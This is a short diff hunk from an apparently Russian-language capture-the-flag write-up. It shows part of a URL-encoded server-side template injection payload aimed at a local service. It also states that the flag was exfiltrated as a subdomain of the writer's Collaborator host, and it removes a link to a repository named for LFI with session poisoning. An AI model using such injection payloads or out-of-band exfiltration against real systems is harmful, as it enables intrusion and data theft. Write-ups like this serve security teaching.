@@ -196,4 +196,3 @@ http://127.0.0.1:9001/get_user_info?name=%7b%25%20if%20self%5brequest.args.get(%
 ```
 ![](./img/img_10.png)
 Получили содержимое флага в качестве поддомена нашего collabarator.
-[LFI_with_sess_poisoning](https://github.com/Truncheon-eng/LFI_with_sess_poisoning)
